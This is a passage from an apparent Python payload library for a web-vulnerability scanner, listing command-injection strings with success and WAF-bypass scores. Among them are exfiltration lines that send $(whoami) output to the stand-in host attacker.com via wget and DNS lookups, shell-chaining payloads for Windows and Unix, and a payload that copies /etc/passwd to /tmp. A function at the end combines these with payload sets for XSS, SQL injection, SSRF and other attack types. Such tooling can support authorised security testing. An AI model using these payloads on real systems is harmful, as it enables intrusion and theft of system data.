            "127.0.0.1;wget http://attacker.com/$(whoami)",
            VulnType.COMMAND_INJECTION, PayloadTier.TIER_2,
            success_rate=0.62, waf_bypass_prob=0.74, false_positive_rate=0.11,
            description="Wget exfiltration", tags=["oob", "exfiltration"],
            source="custom"
        ),
        CuratedPayload(
            "127.0.0.1;nslookup `whoami`.attacker.com",
            VulnType.COMMAND_INJECTION, PayloadTier.TIER_2,
            success_rate=0.60, waf_bypass_prob=0.76, false_positive_rate=0.11,
            description="DNS exfiltration", tags=["oob", "exfiltration", "dns"],
            source="custom"
        ),
        # Windows specific
        CuratedPayload(
            "127.0.0.1 & whoami",
            VulnType.COMMAND_INJECTION, PayloadTier.TIER_2,
            success_rate=0.74, waf_bypass_prob=0.66, false_positive_rate=0.07,
            description="Windows AND", tags=["windows"],
            source="seclists"
        ),
        CuratedPayload(
            "127.0.0.1 && whoami",
            VulnType.COMMAND_INJECTION, PayloadTier.TIER_2,
            success_rate=0.76, waf_bypass_prob=0.64, false_positive_rate=0.06,
            description="Windows double AND", tags=["windows"],
            source="seclists"
        ),
        CuratedPayload(
            "127.0.0.1 | whoami",
            VulnType.COMMAND_INJECTION, PayloadTier.TIER_2,
            success_rate=0.78, waf_bypass_prob=0.62, false_positive_rate=0.06,
            description="Windows pipe", tags=["windows"],
            source="seclists"
        ),
        # Redirect
        CuratedPayload(
            "127.0.0.1;cat /etc/passwd > /tmp/out.txt",
            VulnType.COMMAND_INJECTION, PayloadTier.TIER_2,
            success_rate=0.66, waf_bypass_prob=0.70, false_positive_rate=0.09,
            description="Output redirect", tags=["redirect"],
            source="custom"
        ),
        # Heredoc
        CuratedPayload(
            "cat << EOF\n$(whoami)\nEOF",
            VulnType.COMMAND_INJECTION, PayloadTier.TIER_2,
            success_rate=0.56, waf_bypass_prob=0.76, false_positive_rate=0.13,
            description="Heredoc injection", tags=["heredoc"],
            source="custom"
        ),
    ]


# Integration function
def get_all_tier2_payloads():
    """Get all TIER 2 payloads combined."""
    return (
        get_tier2_xss_payloads() +
        get_tier2_sqli_payloads() +
        get_tier2_lfi_payloads() +
        get_tier2_ssrf_payloads() +
        get_tier2_ssti_payloads() +
        get_tier2_xxe_payloads() +
        get_tier2_command_injection_payloads()
    )